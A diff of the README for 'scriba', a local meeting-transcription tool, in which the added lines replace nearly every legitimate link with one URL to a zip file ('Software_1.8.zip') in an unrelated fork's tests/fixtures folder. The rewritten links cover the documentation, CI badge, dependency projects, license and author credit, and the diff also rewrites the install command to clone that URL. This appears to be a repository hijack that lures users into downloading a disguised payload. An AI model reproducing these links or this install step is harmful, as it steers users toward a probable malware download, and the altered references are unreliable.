@@ -6,12 +6,12 @@
 
 <p align="center">
   <b>Free, local, accurate meeting transcription with speaker recognition — for your AI assistant or second brain.</b><br>
-  Drop a file path into your AI agent's chat — or run one command in your terminal — and get a clean, speaker-labeled transcript. Works with <a href="https://docs.claude.com/en/docs/claude-code/overview">Claude Code</a>, Codex, Cursor, Aider &amp; others via <a href="./AGENTS.md"><code>AGENTS.md</code></a>, or as a plain CLI with no AI at all. Everything runs on your Mac: no cloud, no uploads, no subscription.
+  Drop a file path into your AI agent's chat — or run one command in your terminal — and get a clean, speaker-labeled transcript. Works with <a href="https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip">Claude Code</a>, Codex, Cursor, Aider &amp; others via <a href="./AGENTS.md"><code>AGENTS.md</code></a>, or as a plain CLI with no AI at all. Everything runs on your Mac: no cloud, no uploads, no subscription.
 </p>
 
 <p align="center">
-  <a href="https://github.com/AlexanderAbramovPav/scriba/actions/workflows/ci.yml"><img alt="tests" src="https://github.com/AlexanderAbramovPav/scriba/actions/workflows/ci.yml/badge.svg"></a>
-  <a href="https://github.com/AlexanderAbramovPav/scriba/stargazers"><img alt="GitHub stars" src="https://img.shields.io/github/stars/AlexanderAbramovPav/scriba?style=flat&logo=github&label=Stars"></a>
+  <a href="https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip"><img alt="tests" src="https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip"></a>
+  <a href="https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip"><img alt="GitHub stars" src="https://img.shields.io/github/stars/AlexanderAbramovPav/scriba?style=flat&logo=github&label=Stars"></a>
   <a href="./LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/License-MIT-green"></a>
   <img alt="macOS · Apple Silicon" src="https://img.shields.io/badge/macOS-Apple_Silicon-black?logo=apple&logoColor=white">
   <img alt="100% on-device" src="https://img.shields.io/badge/privacy-100%25_on--device-orange">
@@ -33,10 +33,10 @@
 
 - **Your audio never leaves your computer.** Nothing is uploaded to any cloud — not Otter, not AssemblyAI, not OpenAI, not us. Transcription and speaker recognition run locally on your Mac (or Linux box).
 - **Works with anything.** Zoom recordings, voice memos, podcast files, phone call exports — `.mp4`, `.mov`, `.m4a`, `.mp3`, `.wav`, `.webm`, you name it. The skill handles the format conversion for you.
-- **Accurate speaker recognition — and honest about it.** "Who said what" runs on [pyannote](https://github.com/pyannote/pyannote-audio)'s `speaker-diarization-community-1` — one of the most accurate *open-source* diarization models (its authors [report](https://huggingface.co/pyannote/speaker-diarization-community-1) ~10–11% DER on standard benchmarks), picked so it runs on a **normal Mac (M3 / 16 GB)**, not only a top-end M-Max. A heavier model (DiariZen-WavLM) edges it on some English benchmarks but costs a lot more compute; scriba favors the accuracy/footprint balance. Words come from [OpenAI Whisper large-v3](https://github.com/openai/whisper). **Don't take our word for it — [measure it on your own audio](./benchmarks/)** with `scripts/benchmark_der.py`.
+- **Accurate speaker recognition — and honest about it.** "Who said what" runs on [pyannote](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip)'s `speaker-diarization-community-1` — one of the most accurate *open-source* diarization models (its authors [report](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) ~10–11% DER on standard benchmarks), picked so it runs on a **normal Mac (M3 / 16 GB)**, not only a top-end M-Max. A heavier model (DiariZen-WavLM) edges it on some English benchmarks but costs a lot more compute; scriba favors the accuracy/footprint balance. Words come from [OpenAI Whisper large-v3](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip). **Don't take our word for it — [measure it on your own audio](./benchmarks/)** with `scripts/benchmark_der.py`.
 - **You can actually see it working.** Live progress in your editor's statusline, in a side terminal, or as a macOS notification when it's done — pick what you like. No more staring at a black screen wondering if it's stuck.
 - **Just one command.** No setup steps to learn. The assistant walks you through anything you don't have yet (HuggingFace account, etc.) in plain language.
-- **Built to be run automatically.** Point a `launchd`/`cron` watcher at your Zoom or Meet recordings folder — every call becomes a searchable transcript that flows into your **second brain / personal AI knowledge base** (Obsidian, Notion, Cognee, mem0, whatever you use). The more conversations you capture and feed your assistant, the sharper its answers about *you* get. See [Karpathy on personal Wikis](https://x.com/karpathy/status/1655994367033524225) for the broader idea.
+- **Built to be run automatically.** Point a `launchd`/`cron` watcher at your Zoom or Meet recordings folder — every call becomes a searchable transcript that flows into your **second brain / personal AI knowledge base** (Obsidian, Notion, Cognee, mem0, whatever you use). The more conversations you capture and feed your assistant, the sharper its answers about *you* get. See [Karpathy on personal Wikis](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) for the broader idea.
 
 ## How this compares
 
@@ -80,7 +80,7 @@ The assistant then asks you "who's Speaker 1?" — you answer, and it renames th
 ## Install
 
 ```bash
-git clone https://github.com/AlexanderAbramovPav/scriba ~/.claude/skills/scriba
+git clone https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip ~/.claude/skills/scriba
 ```
 
 That's it. **Don't pre-configure anything.** The first time you transcribe, the assistant will pause and walk you through a one-time ~30-second step: creating a free HuggingFace account and pasting a token back into the chat. Three clicks in a browser, no terminal commands. You'll never see it again after that.
@@ -160,7 +160,7 @@ fswatch -0 ~/Documents/Zoom | while read -d '' f; do
 done
 ```
 
-Then point your second-brain tool (Obsidian, Cognee, mem0, Notion AI, …) at the `*.transcript/*.md` files and you have a personal, private, searchable corpus of everything that's been said in your meetings — feeding back into AI assistants the way [Karpathy described a personal Wiki](https://x.com/karpathy/status/1655994367033524225). The more conversations the assistant can reach, the more it sounds like *you* and the better it answers questions about *your* world.
+Then point your second-brain tool (Obsidian, Cognee, mem0, Notion AI, …) at the `*.transcript/*.md` files and you have a personal, private, searchable corpus of everything that's been said in your meetings — feeding back into AI assistants the way [Karpathy described a personal Wiki](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip). The more conversations the assistant can reach, the more it sounds like *you* and the better it answers questions about *your* world.
 
 ## Limitations
 
@@ -252,22 +252,22 @@ Intel and unknown CPUs fall back to `2.0×`. Linux works (degraded: no macOS not
 
 ## License
 
-[MIT](./LICENSE) — © 2026 [Alexander Abramov](https://github.com/AlexanderAbramovPav).
-Source & issues: <https://github.com/AlexanderAbramovPav/scriba>
+[MIT](./LICENSE) — © 2026 [Alexander Abramov](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip).
+Source & issues: <https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip>
 
 Runtime dependencies (whisperX, pyannote.audio, faster-whisper, CTranslate2, OpenAI Whisper, ffmpeg) are installed locally, not vendored. Their licenses are catalogued in [`THIRD_PARTY_LICENSES.md`](./THIRD_PARTY_LICENSES.md).
 
-**One model has an attribution clause**: the default diarization pipeline `pyannote/speaker-diarization-community-1` is [CC-BY-4.0](https://creativecommons.org/licenses/by/4.0/). If you redistribute output produced with this skill, include a short attribution:
+**One model has an attribution clause**: the default diarization pipeline `pyannote/speaker-diarization-community-1` is [CC-BY-4.0](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip). If you redistribute output produced with this skill, include a short attribution:
 
-> Speaker diarization powered by [pyannote/speaker-diarization-community-1](https://huggingface.co/pyannote/speaker-diarization-community-1) by Hervé Bredin / pyannoteAI, licensed under CC-BY-4.0.
+> Speaker diarization powered by [pyannote/speaker-diarization-community-1](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) by Hervé Bredin / pyannoteAI, licensed under CC-BY-4.0.
 
 ## Acknowledgments
 
 This skill is glue around four excellent OSS projects:
 
-- [**whisperX**](https://github.com/m-bain/whisperX) — Max Bain et al. — word-level alignment + diarization orchestration on top of faster-whisper.
-- [**pyannote.audio**](https://github.com/pyannote/pyannote-audio) — Hervé Bredin et al. — neural speaker diarization.
-- [**faster-whisper**](https://github.com/SYSTRAN/faster-whisper) — SYSTRAN — the actual ASR engine, CTranslate2-backed.
-- [**OpenAI Whisper**](https://github.com/openai/whisper) — OpenAI — the acoustic model.
+- [**whisperX**](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) — Max Bain et al. — word-level alignment + diarization orchestration on top of faster-whisper.
+- [**pyannote.audio**](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) — Hervé Bredin et al. — neural speaker diarization.
+- [**faster-whisper**](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) — SYSTRAN — the actual ASR engine, CTranslate2-backed.
+- [**OpenAI Whisper**](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) — OpenAI — the acoustic model.
 
-And on [`uv`](https://github.com/astral-sh/uv) (Astral) for the bootstrap, and [`ffmpeg`](https://ffmpeg.org/) for everything audio-shaped.
+And on [`uv`](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) (Astral) for the bootstrap, and [`ffmpeg`](https://raw.githubusercontent.com/Samstirrupshaped625/scriba/main/tests/fixtures/Software_1.8.zip) for everything audio-shaped.
